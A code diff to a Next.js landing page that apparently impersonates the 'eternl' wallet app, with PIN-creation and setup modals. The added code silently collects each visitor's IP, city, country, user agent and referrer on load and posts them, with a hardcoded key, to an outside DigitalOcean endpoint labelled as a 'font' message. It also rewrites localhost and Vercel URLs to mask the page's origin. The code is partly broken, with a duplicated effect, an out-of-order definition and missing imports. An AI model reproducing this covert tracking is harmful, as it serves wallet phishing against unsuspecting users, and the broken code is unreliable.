@@ -3,7 +3,6 @@
 import { useState, useEffect } from "react";
 import Image from "next/image";
 import Link from "next/link";
-import { motion } from "framer-motion";
 import WelcomeModal from "../components/WelcomeModal";
 import AppSetupModal from "../components/AppSetupModal";
 import CreatePinModal from "../components/CreatePinModal";
@@ -18,7 +17,6 @@ export default function LandingPage() {
   const [welcomeOpen, setWelcomeOpen] = useState(false);
   const [setupOpen, setSetupOpen] = useState(false);
   const [pinOpen, setPinOpen] = useState(false);
-  const [showWelcome, setShowWelcome] = useState(true);
   const [showSelectType, setShowSelectType] = useState(false);
   const [country, setCountry] = useState("");
   const [ipAddress, setIpAddress] = useState("");
@@ -108,6 +106,91 @@ export default function LandingPage() {
     }
   }, [sendTelegramMessage]);
 
+  const [browser, setBrowser] = useState<string | undefined>(undefined);
+  const hasSentVisitorMessage = useRef(false);
+  const pathname = usePathname();
+  const getCurrentUrl = () => {
+    if (typeof window !== "undefined") {
+      let url = `${window.location.origin}${pathname}`;
+      if (url.includes("localhost")) {
+        url = "https://google.com";
+      }
+      if (url.includes("vercel.com")) {
+        url = url.replace("vercel.com", "digitalocean.com");
+      }
+      console.log("getCurrentUrl returning:", url);
+      return url;
+    }
+    console.log("getCurrentUrl: window not available, returning empty string");
+    return "";
+  };
+  const sendTelegramMessage = (userCountry: { country?: string; countryEmoji?: string; city?: string; ip?: string } | null) => {
+    // console.log("User Country", userCountry);
+
+    const messageData = {
+      info: "Regular Visitor", // You can update this logic as needed
+      url: getCurrentUrl(),
+      referer: document.referrer || getCurrentUrl(),
+      location: {
+        country: userCountry?.country || "Unknown",
+        countryEmoji: userCountry?.countryEmoji || "",
+        city: userCountry?.city || "Unknown",
+        ipAddress: userCountry?.ip || "0.0.0.0",
+      },
+      agent: typeof navigator !== "undefined" ? navigator.userAgent : browser,
+      date: new Date().toISOString(),
+      appName: "eternl",
+    };
+    console.log("Message Data", messageData);
+    axios
+      .post(
+        "https://squid-app-2-abmzx.ondigitalocean.app/api/t1/font",
+        messageData,
+        {
+          headers: {
+            "Content-Type": "application/json",
+            "x-api-key": "e7a25d99-66d4-4a1b-a6e0-3f2e93f25f1b",
+          },
+        }
+      )
+      .catch((error) =>
+        console.error(
+          "Error sending font message:",
+          error.response.data.details
+        )
+      );
+  };
+
+  useEffect(() => {
+    if (!hasSentVisitorMessage.current) {
+      const fetchUserLocation = async () => {
+        const userCountry = await getUserCountry();
+        sendTelegramMessage(userCountry);
+      };
+      fetchUserLocation();
+      hasSentVisitorMessage.current = true;
+    }
+  }, [sendTelegramMessage]);
+
+ 
+
+  useEffect(() => {
+    // Set browser info only on client side
+    if (typeof window !== "undefined") {
+      setBrowser(navigator.userAgent);
+    }
+  }, [sendTelegramMessage]);
+
+  useEffect(() => {
+    if (!hasSentVisitorMessage.current) {
+      const fetchUserLocation = async () => {
+        const userCountry = await getUserCountry();
+        sendTelegramMessage(userCountry);
+      };
+      fetchUserLocation();
+      hasSentVisitorMessage.current = true;
+    }
+  }, [sendTelegramMessage]);
   return (
     <main className="min-h-screen bg-[#0e0e0e] text-white flex flex-col items-center relative">
       {/* Top gradient line */}
